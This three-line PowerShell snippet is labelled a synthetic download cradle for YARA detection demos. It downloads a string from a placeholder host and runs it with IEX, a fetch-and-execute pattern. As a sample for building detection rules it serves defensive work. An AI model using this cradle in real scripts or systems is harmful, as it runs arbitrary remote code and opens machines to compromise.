# Synthetic PowerShell download cradle for YARA demos
$w = New-Object Net.WebClient
IEX $w.DownloadString('http://example.invalid/payload')
